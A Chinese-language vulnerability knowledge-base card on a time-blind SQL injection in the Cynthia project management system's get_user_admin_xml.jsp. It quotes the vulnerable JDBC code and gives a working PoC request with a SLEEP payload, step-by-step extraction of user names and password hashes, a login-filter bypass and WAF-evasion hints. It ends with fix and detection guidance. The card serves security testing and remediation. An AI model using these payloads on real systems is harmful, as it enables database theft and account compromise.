---
id: web-generic-sqli-cynthia-user-list-like-time-blind
title: Cynthia 项目管理系统用户列表 LIKE 拼接时间盲注：initUser=true 的 userName 直入 JDBC Statement
type: scenario
domain: web
path: web/generic/sqli
technique: cynthia-user-list-like-jdbc-concat-time-blind
tags:
- sqli
- java
- jdbc
- statement
- like-injection
- time-blind
- jsp
- user-enumeration
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V207
  verified_at: '2026-11-07T02:12:24+08:00'
  notes: 已对照原文与全部16图核对：图14/16 的 queryAllUsersByStatAndName 用 StringBuffer 手工拼接 user_stat='...' 与 user_name like '%...%' / nick_name like '%...'，Statement 执行；图13 JSP initUser=true 分支取 userStat/userName 并调用该方法；图15 POST /admin/user/get_user_admin_xml.jsp 传 initUser=true&userName=' AND (SELECT 3880 FROM (SELECT(SLEEP(5)))ZRMY)-- HBGX 返回 200/5118ms，均一致。未验证点：原文未标注产品版本，未设 affected_versions；未复跑；一句话结论中的 SQL 轮廓为简写（实际 nick_name 分支末尾无 %，且代码带一个右括号），原理段已按原文贴出精确代码。
url: /docs/web/generic/sqli/web-generic-sqli-cynthia-user-list-like-time-blind/
draft: false
kb_aliases:
- queryAllUsersByStatAndName SQL注入
- get_user_admin_xml.jsp 注入
- initUser=true 注入
- user_name like 拼接盲注
- JDBC Statement LIKE 注入
---

## 一句话结论

Cynthia 项目管理系统的 `get_user_admin_xml.jsp` 在 `initUser=true` 时调用 `queryAllUsersByStatAndName`，把 `userStat`、`userName` 直接拼进 `select * from user_info where 1=1 and user_stat = '<userStat>' and (user_name like '%<userName>%' or nick_name like '%<userName>%')` 的 JDBC `Statement`；`userName=' AND (SELECT 3880 FROM (SELECT(SLEEP(5)))ZRMY)-- HBGX` 使响应延迟约 5 秒，确认时间盲注，可逐字符拖库。

## 原理

- 漏洞代码使用 `StringBuffer` 手工拼 SQL：
  ```java
  StringBuffer sqlBuffer = new StringBuffer();
  sqlBuffer.append("select * from user_info where 1=1 ");
  if (userStat != null && userStat.length() > 0) {
      sqlBuffer.append(" and user_stat = '" + userStat + "' ");
  }
  if (userName != null && !userName.equals("null") && !userName.equals("")) {
      sqlBuffer.append(" and user_name like '%" + userName + "%' or nick_name like '%" + userName + "' )");
  }
  ```
  随后用 `Statement` 执行，未使用 `PreparedStatement`，也没有转义单引号/注释符。
- `userName` 被包裹在 `LIKE '%...%'` 中，攻击者用单引号闭合字符串，接 `AND (SELECT ... SLEEP(5) ...)` 制造时间条件，再用 `-- ` 注释掉后面的 `%' or nick_name ...`，使整条 SQL 语法合法。
- `SLEEP(5)` 被包裹在子查询中（如 `(SELECT 3880 FROM (SELECT(SLEEP(5)))ZRMY)`），避免 MySQL 对 `SLEEP` 直接出现在某些位置的限制；条件为真时延迟 5 秒，为假时立即返回，形成布尔时间 oracle。
- 入口为后台 JSP `get_user_admin_xml.jsp`：普通用户会话即可访问（缺少角色校验），`initUser=true` 触发用户列表查询；`userName` 参数直接进入上述拼接。也可通过登录过滤器的分号/contains 绕过到达。
- 危害：可逐字符读取数据库名、表名、`user_info` 中的用户名/邮箱/密码哈希，进而离线破解或横向；若数据库账号权限高，还可读写文件/进一步提权（取决于 MySQL 配置）。

## 触发条件

- 目标为 Cynthia 项目管理系统（或相同 `queryAllUsersByStatAndName` 代码）；`get_user_admin_xml.jsp` 可访问（普通用户/未授权）。
- `initUser=true` 且 `userName` 参数进入 SQL 拼接；数据库为 MySQL（`SLEEP` 可用）或支持等价延时函数。
- 没有 WAF 拦截单引号、`SLEEP`、`--`、括号等；或存在可绕过的规则。
- 页面响应时间可观测（直接连接或通过代理）。

## 利用步骤

1. 获取可访问 `get_user_admin_xml.jsp` 的会话：注册账号并通过 `changeStat.do` 激活，或利用过滤器分号绕过直接访问。
2. 建立基线：发送 `initUser=true&userName=test`，记录正常响应时间。
3. 验证注入：发送 `initUser=true&userName=' AND (SELECT 3880 FROM (SELECT(SLEEP(5)))ZRMY)-- HBGX`，观察响应是否延迟约 5 秒（原文 5118ms）。
4. 逐字符提取：把 SLEEP 条件替换为基于 `SUBSTRING`/`ASCII` 的布尔表达式，例如 `' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(3),0)-- `；用二分法减少请求数。
5. 依次枚举库名、表名、`user_info` 列名与数据（用户名、邮箱、密码哈希）；拿到哈希后离线破解。
6. 授权测试中限制请求频率、只读取必要字段并打码，避免拖垮业务库。

## PoC

```http
POST /admin/user/get_user_admin_xml.jsp HTTP/1.1
Host: <target>
Cookie: <normal-user-session>
Content-Type: application/x-www-form-urlencoded

initUser=true&userName=' AND (SELECT 3880 FROM (SELECT(SLEEP(5)))ZRMY)-- HBGX
```

原文截图显示该请求返回 `200`，响应时间 `5118ms`（正常请求为毫秒级），确认时间盲注。进一步的库名/表名/字段提取可按标准 MySQL 时间盲注进行；本卡未复跑。

## 变体与关联

- 参数变体：`userStat` 也被直接拼进 `user_stat = '...'`，可用同样方式注入；`userName` 还可走 `nick_name like` 分支。
- 延时变体：`SLEEP`、`BENCHMARK`、笛卡尔积；WAF 拦截时可用 `SLEEP` 替代函数、注释/编码绕过。
- 关联卡：[[web-generic-sqli-fe-system-jdbc-concat-treexml-editflow]]（同为 Java JSP/JDBC 拼接注入）、[[web-generic-sqli-like-clause-append-search]]（LIKE 字符串拼接注入）、[[web-generic-auth-cynthia-filter-contains-semicolon-account-takeover]]（同一系统的过滤器绕过与用户信息泄露）。
- 边界：若代码已改为 `PreparedStatement`/MyBatis `#{}`，或 WAF 严格拦截且无法绕过，注入不成立；时间盲注依赖稳定响应时间，网络抖动会影响判断。

## 检测与防御

- 修复：使用 `PreparedStatement` 参数化 `userStat`/`userName`；LIKE 的 `%` 拼接应在参数值上做，不要拼 SQL 字符串；或使用 ORM 的绑定参数。
- 输入校验：`userStat` 限制为枚举值，`userName` 限制长度与字符集；对单引号、注释符、`SLEEP` 等做拦截与日志。
- 权限：`get_user_admin_xml.jsp` 增加服务端角色校验；生产禁用 `initUser` 调试参数；数据库账号最小权限，禁用 FILE/高权限。
- 检测：同一会话/接口出现 `SLEEP`、`BENCHMARK`、大量 `SUBSTRING/ASCII` 请求；响应时间异常；WAF 命中单引号+注释组合。
- 响应：确认注入后下线接口、审计是否已拖库、轮换用户口令与数据库凭据。
